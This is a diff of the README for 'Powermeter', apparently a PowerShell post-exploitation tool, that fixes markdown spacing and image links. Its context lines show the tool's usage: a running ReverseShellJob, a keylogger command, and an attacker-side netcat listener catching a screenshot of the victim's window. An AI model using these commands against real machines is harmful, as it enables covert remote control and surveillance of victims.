@@ -71,15 +71,15 @@ Powermeter>get sysinfo
 
 #### set FLPORT=\<PORT>
 
-Powershell>set FLPORT=9192  
-[+]FLPORT is set  
+	Powershell>set FLPORT=9192  
+	[+]FLPORT is set  
 
 ![pm4](https://github.com/mfcekirdek/Powermeter/blob/master/pm4.png "pm4")
 
 #### get username
 
-Powermeter>get username  
-decoder  
+	Powermeter>get username  
+	decoder  
 
 ![pm5](https://github.com/mfcekirdek/Powermeter/blob/master/pm5.png "pm5")
 
@@ -122,22 +122,22 @@ Powermeter>stop job -reverseShell
 
 #### show jobs
 
-Powermeter>show jobs
-[+]Active jobs:
+Powermeter>show jobs  
+[+]Active jobs:  
 
-JobStateInfo  : Running
-Finished      : System.Threading.ManualResetEvent
-InstanceId    : 50fae208-73d2-4ea0-8f91-0c37597c918b
-Id            : 5
-Name          : ReverseShellJob
-ChildJobs     : {Job6}
-Output        : {}
-Error         : {}
-Progress      : {}
-Verbose       : {}
-Debug         : {}
-Warning       : {}
-State         : Running
+JobStateInfo  : Running  
+Finished      : System.Threading.ManualResetEvent  
+InstanceId    : 50fae208-73d2-4ea0-8f91-0c37597c918b  
+Id            : 5  
+Name          : ReverseShellJob  
+ChildJobs     : {Job6}  
+Output        : {}  
+Error         : {}  
+Progress      : {}  
+Verbose       : {}  
+Debug         : {}  
+Warning       : {}  
+State         : Running  
 
 ![pm9](https://github.com/mfcekirdek/Powermeter/blob/master/pm9.png "pm9")
 
@@ -169,9 +169,9 @@ On attacker side> nc -lvp 9192 > screenshotActiveWindow.png
 Powermeter>screencap -activeWindow  
 [+]Screenshot is saving..  
 
-![pm14](https://github.com/mfcekirdek/Powermeter/blob/master/pm2.png "pm14")
+![pm14](https://github.com/mfcekirdek/Powermeter/blob/master/pm14.png "pm14")
 
-![pm24](https://github.com/mfcekirdek/Powermeter/blob/master/pm2.png "pm24")
+![pm24](https://github.com/mfcekirdek/Powermeter/blob/master/pm24.png "pm24")
 
 #### start keylogger & stop job -keylogger
 
